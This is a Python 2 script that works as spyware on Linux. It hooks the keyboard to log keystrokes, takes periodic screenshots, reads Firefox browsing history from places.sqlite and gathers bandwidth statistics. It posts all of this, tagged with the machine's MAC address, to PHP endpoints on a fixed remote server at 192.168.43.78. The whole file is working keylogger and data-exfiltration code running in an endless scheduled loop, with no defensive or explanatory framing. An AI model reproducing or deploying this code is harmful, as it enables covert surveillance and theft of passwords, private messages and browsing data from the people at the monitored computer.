import time,pyautogui,requests
import schedule,os,subprocess
import base64,pyxhook,sqlite3
import getpass,json,glob
im2=[]
user= getpass.getuser()
url = "http://192.168.43.78:8080/web.php"
s=subprocess.check_output("cat /sys/class/net/eth0/address",shell=True)
os.chdir("/home/"+user+"/.mozilla/firefox")
diri=glob.glob("*.default")
print diri
os.chdir("/home/"+user+"/.mozilla/firefox"+"/"+str(diri[0]))
conn = sqlite3.connect('places.sqlite')
print "connection successfull"
count=0
##### function for screenshot##############
def screenshot():
	s=subprocess.check_output("cat /sys/class/net/eth0/address",shell=True)
	im2.append(pyautogui.screenshot('/home/ajinkya/abc/screenshot.png'))
	s=subprocess.check_output("cat /sys/class/net/eth0/address",shell=True)
	time.sleep(1)
	print(s)
       #sending to server
	url = "http://192.168.43.78:8080/img.php"
	
	encoded_string = ""
	with open('/home/ajinkya/abc/screenshot.png','rb') as img:
		encoded_string = base64.b64encode(img.read())
	
	params={'file':encoded_string,'mac':s}
	
	r = requests.post(url, params)
	
	print (r.status_code)
	print (r.text)
	time.sleep(1)
	os.system("rm /home/ajinkya/abc/screenshot.png")
######over##################

##### function for keylogger##############
counter=0
str1=""
s=""
def newobj():
	
	new_hook=pyxhook.HookManager()
	new_hook.KeyDown=OnKeyPress
	#hook the keyboard
	new_hook.HookKeyboard()
	return new_hook
def OnKeyPress(event):
	global str1,counter,s

	
	#print counter
	if event.Key== "Up" or event.Key=="Down":
		print event.Key
		str1=str1+""
	elif event.Key=="space":
		print event.Key
		str1=str1+" "
		counter=counter+1
	elif event.Key=="BackSpace":
		print event.Key
		str1=str1+'<-'
		counter=counter+1
	else:
		print event.Key
		str1=str1+event.Key
		counter=counter+1

	if(counter==10):
		url = "http://192.168.43.78:8080/kl.php"          ###after 10 characters send!!!
		params={'text':str1,'mac':s}
		counter=0
	
		str1=""
		r = requests.post(url, params)

		print (r.status_code)
		print (r.text)
	#if event.Ascii==96: #96 is the ascii value of the grave key (`)
		print "good bye"
	#listen to all keystrokes

def f(new_hook):
	global str1,counter,s
	counter=0
	s=subprocess.check_output("cat /sys/class/net/eth0/address",shell=True) ##get mac id
	#time.sleep(1)
	print(s)
       
	#instantiate HookManager class

	#start the session
	new_hook.start()
	return 1
##############OVER#### WHERE TO CALL

### function for webhistory###########

def counting():
	global count
	cursor1=conn.execute("select id from moz_places order by id desc limit 1")
	result=cursor1.fetchone()
	count=int(result[0])
counting()	
	
def web():
	global count
	cursor=conn.execute("select * from moz_places where id > "+str(count))
	#for i in cursor:
		#print i[10]
	l_url=[]
	l_title=[]
	l_host=[]
	l_freq=[]
	l_dt=[]

	row = cursor.fetchone()
	while row is not None:
	
		l_url.append(row[1])
		l_url.append(',')
		l_title.append(row[2])
		l_title.append(',')
		l_host.append(row[3])
		l_host.append(',')
		l_freq.append(row[8])
		l_freq.append(',')
		l_dt.append(row[9])
		l_dt.append(',')
		row=cursor.fetchone()
	#print l_host
	data={'url':json.dumps(l_url),'title':json.dumps(l_title),'host':json.dumps(l_host),'freq':json.dumps(l_freq),'date':json.dumps(l_dt),'mac':s}
	r = requests.post(url,data=data)
	print (r.status_code)
	print (r.text)
	print("PATHAVAL")
	counting()

def usage():
	s=subprocess.check_output("cat /sys/class/net/eth0/address",shell=True)
	url = "http://192.168.43.78:8080/vnstat.php"
	usage=subprocess.check_output("vnstat -d --oneline -i wlan0",shell=True)
	incomming=usage.split(';')
	if incomming[3].split()[0]<300:
		params={'text':1,'mac':s}
		r = requests.post(url, params)
		print (r.status_code)
		print (r.text)
		print "safe"
	elif incomming[3].split()[0]>300 and incomming[3].split()[0]>600:
		params={'text':2,'mac':s}
		r = requests.post(url, params)
		print (r.status_code)
		print (r.text)
		print "moderate"
	else:
		params={'text':3,'mac':s}
		r = requests.post(url, params)
		print (r.status_code)
		print (r.text)
		print "warn"
### CALLING############
new_hook=newobj()
f(new_hook)
schedule.every(.25).minutes.do(screenshot)
schedule.every(.20).minutes.do(web)
schedule.every(.20).minutes.do(usage)
while True:
    schedule.run_pending()
